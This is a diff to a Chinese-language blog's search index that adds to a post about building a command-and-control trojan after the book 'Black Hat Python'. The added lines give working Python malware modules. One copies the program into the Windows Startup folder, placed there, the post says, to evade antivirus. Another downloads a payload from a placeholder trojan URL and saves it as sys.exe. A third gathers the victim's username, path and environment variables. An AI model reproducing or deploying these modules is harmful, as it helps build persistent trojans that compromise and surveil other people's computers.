@@ -65,14 +65,15 @@
     <content><![CDATA[<p>好久不写博客了，写博客是个好习惯XD</p>
 <h1 id="是的，正如标题所说，我做了一个C-amp-C（command-amp-control）通信的木马"><a href="#是的，正如标题所说，我做了一个C-amp-C（command-amp-control）通信的木马" class="headerlink" title="是的，正如标题所说，我做了一个C&amp;C（command&amp;control）通信的木马"></a>是的，正如标题所说，我做了一个C&amp;C（command&amp;control）通信的木马</h1><span id="more"></span>
 
-<p>这个木马不再需要你去琢磨怎样搞内网穿透，而是直接连接服务器,拉取需要的任务，再执行<br>具体的内容你可以看《Python黑帽子》一书（啊对，这玩意不是我写的，以我的技术怎么可能嘛</p>
+<p>这个木马不再需要你去琢磨怎样搞内网穿透，而是直接连接服务器,拉取需要的任务，再执行<br>具体的内容你可以看《Python黑帽子》一书,里面有源代码（啊对，这玩意不是我写的，以我的技术怎么可能嘛</p>
 <p><em>但是</em>作者在书中给我们留下了回味空间，只给出了两个基本的模块，那想要这个木马变得更好，肯定要再加一些模块</p>
 <p>首先我想到的就是加入开机启动项，写入注册表不安全，会被杀软查到，所以就放入开始菜单文件夹的启动一项</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">代码在kali虚拟机，明天再放OVO</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os </span><br><span class="line">import sys</span><br><span class="line">def run():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*]In shutdown moudule.&#x27;</span>)</span><br><span class="line">    path = os.path.abspath(sys.argv[0])</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&#x27;&#123;path&#125;&#x27;</span>)</span><br><span class="line">    os.system(f<span class="string">&#x27;copy &#123;path&#125; &quot;%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;&#x27;</span>)</span><br><span class="line"><span class="comment">#别问我为啥要用cmd指令，问就是别的不会TT</span></span><br></pre></td></tr></table></figure>
 <p>这样我的木马就驻扎在了受害者电脑里<br>那如果我需要一些更多的模块在受害者电脑上捣乱，是不是就要在他电脑上安装python了？（doge<br>没那么麻烦，只需要自动拉取仓库就可以了<br>这里使用了request库</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;木马的url&quot;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="comment"># 写入图片</span></span><br><span class="line">with open(<span class="string">&quot;sys.exe&quot;</span>, <span class="string">&quot;wb&quot;</span>) as f:</span><br><span class="line">    f.write(r.content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>（作者很懒，只写了这些，会更新</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;木马的url&quot;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"></span><br><span class="line">with open(<span class="string">&quot;sys.exe&quot;</span>, <span class="string">&quot;wb&quot;</span>) as f:</span><br><span class="line">    f.write(r.content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>书中的获取环境变量模块比较简陋，我应该让他返回一个整齐地、能返回用户名和所在文件目录信息</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line">    usn = <span class="string">&#x27;username:&#x27;</span> + os.getlogin()</span><br><span class="line">    pth = <span class="string">&#x27;path:&#x27;</span> + os.getcwd()</span><br><span class="line">    evn = os.environ</span><br><span class="line">    msg = f<span class="string">&#x27;&#123;usn&#125;\n&#123;pth&#125;\n&#123;evn&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&#x27;&#123;msg&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>氢氢悚悚！（doge</p>
 ]]></content>
   </entry>
 </search>
